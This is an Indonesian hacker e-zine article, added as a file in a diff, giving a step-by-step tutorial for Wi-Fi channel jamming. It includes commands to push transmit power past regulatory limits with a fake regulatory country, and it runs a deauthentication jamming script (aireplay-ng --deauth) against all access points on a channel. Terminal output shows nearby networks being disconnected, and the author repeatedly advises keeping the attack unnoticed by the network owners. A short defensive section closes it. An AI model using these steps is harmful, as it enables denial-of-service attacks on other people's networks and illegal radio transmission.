@@ -1,0 +1,424 @@
+ECHO MAGAZINE VOLUME X, ISSUE XXV, PHILE 0x10.TXT
+__________       ______  __       __________________               
+___  ____/__________  / / /______ ____  /___  /___(_)_______ _____ 
+__  __/   _  ___/__  /_/ / _  __ \___  / __  / __  / __  __ \_  _ \
+_  /___   / /__  _  __  /  / /_/ /__  /  _  /___  /  _  / / //  __/
+/_____/   \___/  /_/ /_/   \____/ _  /   /____//_/   /_/ /_/ \___/ 
+                                  /_/
+  Wireless : Channel Jamming
+  lirva32 [at] echo [dot] or [dot] id
+
+-----[ Pendahuluan
+
+  Wireless Jamming ? hhhmmm, apa lagi tuh.. oooowwww, yang pasti bukan sejenis
+  gado2 ataupun kredok, swear ini bukan sejenis makanan loh...  Wireless
+  Jamming sendiri merupakan kegiatan merusak atau membendung frekuensi,
+  membanjiri Channel dengan packet data ataupun membanjiri Radio wireless
+  dengan koneksi sebanyak2nya sehingga menyebabkan Radio wireless tidak bekerja
+  untuk sementara.
+
+  Ada beberapa Jenis Wireless Jamming terhadap wireless, diantaranya :
+  1. RF Jamming, yaitu kegiatan merusak dan membendung frekuensi dengan
+  peralatan tertentu yang menyebabkan semua wireless pada frekuensi yang sama
+  tidak dapat bekerja selama perangkat jamming diaktifkan.
+
+  2. Channel Jamming, yaitu kegiatan membanjiri Channel dengan packet data dan
+  jumlah koneksi yang berlebihan, menyebabkan channel menjadi penuh sehingga
+  semua koneksi menjadi terputus.  Jadi, teknis ini akan melakukan penyerangan
+  terhadap Channel sehingga semua Radio Wireless yang berada pada Channel yang
+  sama akan menyebabkan terputus.  Misalkan saja saya melakukan penyerangan
+  terhadap Channel 11 maka semua Radio Wireless yang menggunakan Channel
+  tersebut akan terputus selama penyerangan berlangsung.
+
+  3. Radio AP Jamming, yaitu kegiatan membanjiri Radio Wireless dengan packet
+  data dan dengan jumlah koneksi yang berlebihan, serangan langsung tertuju
+  pada Radio Wireless (--dalam hal ini adalah AP) dengan identitas MAC Address,
+  sehingga semua user yang terkoneksi pada Radio Wireless tersebut menjadi
+  terputus (diassosiated).
+
+-----[ Channel Jamming 
+
+  Pada tulisan kali ini saya hanya memaparkan bagaimana melakukan penyerangan
+  Channel Jamming terhadap jaringan wireless yang menjadi target.  
+  
+  Jadi tidak dibenarkan jika tindakan Jamming ini digunakan untuk melakukan
+  penyerangan terhadap jaringan wireless milik pemerintah, sekolah ataupun
+  tanksi2 sosial lainnya, SUMPAH !!! saya tidak bertanggung jawab terhadap apa
+  yang kalian lakukan...!!! 
+
+  Persiapan :
+  1. Laptop dengan OS BT5 R1
+     Harus Backtrack ? ga juga sih, memang kebetulan notebook saya terinstall
+     BT 5 R1.
+
+  2. WiFi USB Frekuensi 2.4 Ghz
+     Ya, saya sarankan pake wireless USB dengan power 1000 mW atau 2000 mW,
+     sehingga kita bisa melakukan Jamming dari jarak yang cukup jauh dan tidak
+     terlihat oleh orang lain ketika kita melakukan kegitan Jamming.  Dalam
+     kegiatan Jamming kali ini saya mempergunakan : Wireless USB SignalKing
+     2000 mW
+
+  3. Antena Omni 10 dBi - 38 dBi Frekuensi 2.4 Ghz
+     Ya, sehingga kita bisa mencari target dengan coverage area yang lebih
+     luas.  Dalam kegiatan kali ini saya mempergunakan antena omni bawaan USB
+     Wireless SignalKing : 38 dBi.
+
+  4. Mental yang tidak mencurigakan.
+     Ini sangat diperlukan sekali agar kegiatan kita tidak dicurigai oleh
+     siapapun !!!
+
+-----[ Persiapan
+
+  Yup, sebelum melakukan aksi yang mendebarkan ini, wweedeeeyyy gile aze ;)
+  maka kita harus mempersiapkan diri dengan baik, terutama kita harus
+  meningkatkan power USB wireless kita, dengan cara :
+
+
+  cek power USB Wireless yang akan kita gunakan :
+  -----------------------------------------------
+  lo        no wireless extensions.
+
+  eth0      no wireless extensions.
+
+  wlan0     IEEE 802.11abg  ESSID:off/any  
+            Mode:Managed  Access Point: Not-Associated   Tx-Power=15 dBm   
+            Retry  long limit:7   RTS thr:off   Fragment thr:off
+            Encryption key:off
+            Power Management:off
+          
+  wlan1     IEEE 802.11bgn  ESSID:off/any  
+            Mode:Managed  Frequency:2.457 GHz  Access Point: Not-Associated   
+            Tx-Power=20 dBm   
+            Retry  long limit:7   RTS thr:off   Fragment thr:off
+            Encryption key:off
+            Power Management:on
+
+
+  keterangan :
+  Okay bro, coba lihat :
+  . wlan0 (bawaan notebook) cuma  dapat power : 15 dBm = 32 mW
+  . wlan1 (wifi usb signal king) cuma dapat power : 20 dBm = 100mW
+
+  Nah, wlan1 itu seharusnya memiliki power 1000 mW - 2000mW berdasarkan
+  spesifikasi yang diberikan oleh SignalKing, tapi ternyata secara default
+  hanya memiliki power 20 dBm (100mW). Uppppp... jangan kaget, itu adalah
+  standar regulasi negara, dan masih bisa ditingkatkan sesuai dengan
+  spesifikasinya ;)  Okay, yuk mang sekarang kita tingkatkan powernya :
+
+  Untuk menjadikan wireless dengan power 1000 mW :
+  ------------------------------------------------
+  root@bt:/# ifconfig wlan1 down
+  root@bt:/# iw reg set BO
+  root@bt:/# ifconfig wlan1 up
+
+
+  hasil :
+  root@bt:~# iwconfig
+  lo        no wireless extensions.
+
+  eth0      no wireless extensions.
+
+  wlan0     IEEE 802.11abg  ESSID:off/any  
+            Mode:Managed  Access Point: Not-Associated   Tx-Power=15 dBm   
+            Retry  long limit:7   RTS thr:off   Fragment thr:off
+            Encryption key:off
+            Power Management:off
+          
+  wlan1     IEEE 802.11bgn  ESSID:"xxxxx-Lt2"  
+            Mode:Managed  Frequency:2.457 GHz  Access Point: 00:25:9C:C9:EA:B0   
+            Bit Rate=36 Mb/s   Tx-Power=30 dBm   
+            Retry  long limit:7   RTS thr:off   Fragment thr:off
+            Encryption key:off
+            Power Management:on
+            Link Quality=57/70  Signal level=-53 dBm  
+            Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+            Tx excessive retries:1  Invalid misc:9   Missed beacon:0
+
+
+
+  Keterangan :
+  wlan1 sudah meningkat powernya menjadi 30 dBm = 1000mW, artinya siap
+  digunakan untuk Jamming dari area yang sangat jauh sehingga kegiatan bisa
+  dilakukan dengan aman.
+
+  untuk menjadikan wireless dengan power 2000mW :
+  ------------------------------------------------
+  root@bt: # cd /home/lirva32
+
+  root@bt:/home/lirva32# wget http://wireless.kernel.org/download/wireless-regdb/wireless-regdb-2011.04.28.tar.bz2
+  root@bt:/home/lirva32# tar -jxf wireless-regdb-2011.04.28.tar.bz2
+
+  root@bt:/home/lirva32/wireless-regdb-2011.04.28# ls
+
+  db2bin.py    debian-example        README               root.key.pub.pem
+  dbparse.py   LICENSE               regulatory.bin       sha1sum.txt
+  dbparse.pyc  linville.key.pub.pem  regulatory.bin.5     web
+  db.txt       Makefile              regulatory.bin.5.gz  wireless-regdb.spec
+
+
+  root@bt:/home/lirva32/wireless-regdb-2011.04.28# nano db.txt
+
+  tambahkan pada baris akhir "country:, sbb : 
+
+  +---------------------------------------+
+  | country MM:                           | 
+  |        (2402 - 2492 @ 35), (N/A, 35)  |
+  |        (4910 - 5835 @ 35), (N/A, 35)  |
+  +---------------------------------------+
+
+  jangan lupa yeh, abis nambahin baris seperti diatas terus disimpen ;)
+
+
+  root@bt:/home/lirva32/wireless-regdb-2011.04.28# apt-get install python-m2crypto
+  root@bt:/home/lirva32/wireless-regdb-2011.04.28# make
+  root@bt:/home/lirva32/wireless-regdb-2011.04.28# cp regulatory.bin /usr/lib/crda/
+
+  Install ulang CRDA dan Custom Regulator :
+  -----------------------------------------
+
+  root@bt:/home/lirva32 # wget http://wireless.kernel.org/download/crda/crda-1.1.2.tar.bz2
+  root@bt:/home/lirva32 # tar -xvjf crda-1.1.2.tar.bz2
+
+  root@bt:/home/lirva32/wireless-regdb-2011.04.28 # cp root.key.pub.pem /home/lirva32/crda-1.1.2/pubkeys/
+
+  root@bt:/home/lirva32/crda-1.1.2# apt-get install libnl-dev
+
+  root@bt:/home/lirva32/crda-1.1.2# make
+  root@bt:/home/lirva32/crda-1.1.2# make install
+
+  root@bt:/# init 6
+  root@bt:/# ifconfig wlan1 down
+  root@bt:/# iw reg set MM
+  root@bt:/# ifconfig wlan1 up
+
+
+  keterangan : 
+  MM adalah country yang Anda buat sebelumnya.
+
+-----[ Testing Power 
+
+  root@bt:~# iwconfig
+  lo        no wireless extensions.
+
+  eth0      no wireless extensions.
+
+
+  wlan0     IEEE 802.11abg  ESSID:off/any  
+            Mode:Managed  Access Point: Not-Associated   Tx-Power=15 dBm   
+            Retry  long limit:7   RTS thr:off   Fragment thr:off
+            Encryption key:off
+            Power Management:off
+
+
+  wlan1     IEEE 802.11bgn  ESSID:"Bina Insani-Lt1"  
+            Mode:Managed  Frequency:2.437 GHz  Access Point: 00:0B:6B:09:26:EB   
+            Bit Rate=1 Mb/s   Tx-Power=35 dBm   
+            Retry  long limit:7   RTS thr:off   Fragment thr:off
+            Encryption key:off
+            Power Management:on
+            Link Quality=43/70  Signal level=-67 dBm  
+            Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+            Tx excessive retries:0  Invalid misc:15   Missed beacon:0
+
+
+  Keterangan :
+  Perhatikan wlan1, ternyata powernya sudah 35 dBm yang setara dengan 2000mW.
+  Nah, kalo power udah segini gedenya berarti kita bisa melakukan penyerangan
+  dari jarak yang lebih jauh lagi, tantu tidak dicurigai oleh pemilik radio
+  wireless.
+
+-----[ Penyerangan Radio Wireless dengan Jamming 
+
+  Yuk mang, mari kita melakukan penyerangan terhadap Radio Wireless yang
+  menjadi target, tapi sebelumnya download dulu : wifijammer_0.1.sh, di
+  http://code.google.com/p/wifijammer/downloads/list Sebenarnya
+  wifijammer_0.1.sh berkerja dengan memanfaatkan : 
+  1. Airodump-ng : yang digunakan untuk mengumpulkan skema aktif terhadap Radio 
+     Wireless yang memiliki channel yang menjadi sasaran penyerangan.
+  2. Aireplay-ng : yang digunakan untuk melakukan penyerangan dengan metode : 
+     aireplay-ng --deauth 0 -a
+
+  Mari kita mencari target Channel yang akan kita serang :
+
+  root@bt:~# airmon-ng start wlan1
+
+  Found 5 processes that could cause trouble.
+  If airodump-ng, aireplay-ng or airtun-ng stops working after
+  a short period of time, you may want to kill (some of) them!
+
+  PID	    Name
+  1284	  dhclient3
+  1355	  dhclient3
+  2598	  wpa_supplicant
+  2610    dhclient
+  2629	  dhclient
+  Process with PID 2598 (wpa_supplicant) is running on interface wlan1
+  Process with PID 2629 (dhclient) is running on interface wlan1
+  Process with PID 1284 (dhclient3) is running on interface wlan0
+
+
+  Interface	  Chipset		Driver
+
+  wlan1		Ralink RT2870/3070	rt2800usb - [phy1]
+			         	(monitor mode enabled on mon0)
+  wlan0		Intel 3945ABG	        iwl3945 - [phy0]
+
+
+
+  root@bt:~# iwconfig
+  lo        no wireless extensions.
+
+  eth0      no wireless extensions.
+
+  wlan1     IEEE 802.11bgn  ESSID:"BinaInsani-Lt2"  
+            Mode:Managed  Frequency:2.457 GHz  Access Point: 00:25:9C:C9:EA:B0   
+            Bit Rate=18 Mb/s   Tx-Power=35 dBm   
+            Retry  long limit:7   RTS thr:off   Fragment thr:off
+            Encryption key:off
+            Power Management:on
+            Link Quality=57/70  Signal level=-53 dBm  
+            Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+            Tx excessive retries:84  Invalid misc:4   Missed beacon:0
+
+  wlan0     IEEE 802.11abg  ESSID:off/any  
+            Mode:Managed  Access Point: Not-Associated   Tx-Power=15 dBm   
+            Retry  long limit:7   RTS thr:off   Fragment thr:off
+            Encryption key:off
+            Power Management:off
+          
+  mon0      IEEE 802.11bgn  Mode:Monitor  Tx-Power=35 dBm   
+            Retry  long limit:7   RTS thr:off   Fragment thr:off
+            Power Management:on
+
+
+  root@bt:~# airodump-ng mon0
+
+
+  CH 10 ][ Elapsed: 49 s ][ 2012-04-23 13:29 ][ Decloak: 00:25:9C:C9:EA:B0                                               
+                                                                                                                                                            
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID                                                                             
+                                                                                                                                                            
+ 00:1E:C1:AB:35:9B  -40        4        0    0  11  54 . OPN              Bxxxxxxxxxxium                                                     
+ 00:25:9C:C9:EA:B0  -62      143     7025  146  10  54e  WPA  CCMP   PSK  BxxxxxxxxxxLt2                                                                    
+ 00:27:22:9A:40:DD  -74        1        0    0   9  54e. OPN              XNet                                                                              
+ 00:25:9C:C1:30:95  -75       38        1    0  10  54e  WPA  CCMP   PSK  Bxxxxxxxxxxxxaan                                                           
+ F8:D1:11:93:9F:3E  -79        2        0    0  11  54 . OPN              TEMBAGAISME2 
+
+ Keterangan :
+ Channel aktif : 9, 10, dan 11
+
+
+  Mari kita serang Channel 11 :
+  -----------------------------
+
+  syntax : root@bt:/home/lirva32# ./wifijammer_0.1.sh wifi_card_monitor
+
+  
+  root@bt:/home/lirva32# ./wifijammer_0.1.sh mon0
+  Using user specified wifi card mon0 
+  Please specify a channel to jam, or type in 'scan' (without quotes) to see airodump's output for 40 seconds:
+
+  11
+
+  * 11 itu angka yang kita ketik dari keyboard, angka tersebut menunjukkan
+  Channel yang akan kita Jamming.
+
+  Kini saatnya Anda berhitung, hanya dalam waktu 50 detik semua Radio Wireless
+  yang berada pada Channel 11 akan lumpuh dan tidak bisa bekerja.  Pemilik
+  Radio Wireless harus mematikan listriknya dan menghidupkannya kembali agar
+  Radio Wireless dapat bekerja kembali.
+
+-----[ Hasil Penyerangan yang dipantau dengan KISMET :
+
+  ---Kismet Server Console------------------------------------------------------++
+  |       /disassociation of all clients, possible DoS                          ||
+  |INFO: Detected new probe network "engsun", BSSID 38:0A:94:60:C8:0B,          ||
+  |      encryption no, channel 0, 54.00 mbit                                   ||
+  |ERROR: Could not connect to the GPSD server, will reconnect in 30 seconds    ||
+  |INFO: Detected new probe network "Bina Insani-Lt1", BSSID 70:D4:F2:A1:34:65  ||
+  |      , encryption no, channel 0, 54.00 mbit                                 ||
+  |INFO: Found IP range 192.168.1.16/255.255.255.254 for network                ||
+  |      00:1C:DF:A3:DC:B5                                                      ||
+  |INFO: Detected new probe network "engsun", BSSID CC:52:AF:11:07:38,          ||
+  |      encryption no, channel 0, 54.00 mbit                                   ||
+  |ERROR: Could not connect to the GPSD server, will reconnect in 30 seconds    ||
+  |ALERT: BCASTDISCON Network BSSID 00:1C:DF:A3:DC:B5 broadcast deauthenticate  ||
+  |       /disassociation of all clients, possible DoS                          ||
+  |ALERT: BCASTDISCON Network BSSID 00:1C:DF:A3:DC:B5 broadcast deauthenticate  ||
+  |       /disassociation of all clients, possible DoS                          ||
+  |ALERT: BCASTDISCON Network BSSID 00:1C:DF:A3:DC:B5 broadcast deauthenticate  ||
+  |       /disassociation of all clients, possible DoS                          ||
+  |ALERT: BCASTDISCON Network BSSID 00:0B:6B:09:26:EB broadcast deauthenticate  ||
+  |       /disassociation of all clients, possible DoS                          ||
+  |ALERT: BCASTDISCON Network BSSID 00:1C:DF:A3:DC:B5 broadcast deauthenticate  ||
+  |       /disassociation of all clients, possible DoS                          ||
+  |                                                                             ||
+  +-----------[ Kill Server ]-------------------[ Close Console Window ]--------++
+
+
+-----[ Analisis kerja wifijammer_0.1.sh :
+
+   Mempergunakan tools adalah pekerjaan yang gampang dan tidak membuang energi,
+   tapi hasil akhirnya kita tidak tau apa2, oleh karena itu ada baiknya kita
+   bisa melakukan analisis terhadap tools yang kita gunakan, sehingga kita bisa
+   mengetahui teknik dan jenis serangan yang dipergunakan.  Saya melakukan
+   analisis kerja dari wifijammer_0.1.sh sebagai berikut :
+   
+   [01]  wifijammer_0.1.sh meminta attacker untuk memasukan Channel yang akan
+         diserang
+   [02]  wifijammer_0.1.sh akan merubah wlan yang kita gunakan menjadi mode 
+         monitoring dengan memanfaatkan : airmon-ng
+   [03]  wifijammer_0.1.sh akan menfilter Radio Wireless (AP) yang menjadi target 
+         penyerangan dengan memanfaatkan airodump-ng untuk mendapatkan MAC Address 
+         si Radio Wireless (AP)
+   [04]  Setelah itu wifijammer_0.1.sh akan melakukan penyerangan satu per satu 
+         terhadap MAC Address yang sudah dikumpulkan pada proses [03] dengan 
+         menggunakan : aireplay-ng --deauth 0 -a.
+
+   Simple kan...?? ya iya dong, kalo kagak pasti puser mu bodong....lol
+
+-----[ Penanggulangan
+ 
+  Agar Radio Wireless yang kita miliki tidak menjadi sasaran "empuk" dari
+  serangan Jamming, sebaiknya :
+
+  1.  Mendirikan Radio Wireless dengan Radio Wireless yang support DoS
+      Prenvention, yaitu mampu mencegah :
+      . System Flood          : SYN
+      . System Flood          : FIN
+      . Systen Flood          : UDP
+      . Systen Flood          : ICMP
+      . Pre-source IP Flood   : SYN
+      . Pre-source IP Flood   : FIN
+      . Pre-source IP Flood   : UDP
+      . Ping of Death
+      . TCP Scan
+      . TCP Syn With Data
+      . UDP Bombs
+      . UDP Echo Chargen
+
+      Adapun jenis Radio Wireless yang menyediakan services Anti DoS, antara lain :
+      (01) Edimax n150
+      (02) Netgear WNR3500L
+      (03) etc
+      
+
+  2. Mendirikan Radio Wireless dengan Radio yang support dan flesibel dalam 
+     pembuatan Firewall Rule, seperti :
+     (01) Mikrotik Groove A5Hn
+     (02) Mikrotik RB751U-2HND
+     (03) etc
+
+-----[ Referensi :
+
+  [x] http://linuxwireless.org/en/developers/Regulatory
+
+-----[ Greetz :
+
+  [x] Echo|Staff 
+  [x] MyDaughter : Faiza Debian dan Fivana Gutsy "Anakku...ini dunia ayahmu.. tidak usah malu !! :)"
+  [x] Kang Arif s4kitj1wa, Flexus, SheraYusuf, etc
+  [x] Asistenku : Rouda, Roso n Rahmad... thx for everythings.....
+  [x] AllMyStudent@STMIK Bina Insani : kalian bisa menjadi apa yang kalian inginkan..belajarlah..!!!  
+  [x] GXRG, RNDC, MyAlmamater : FTI_Univ_Budi_Luhur, IndonesianLockPicking.
+
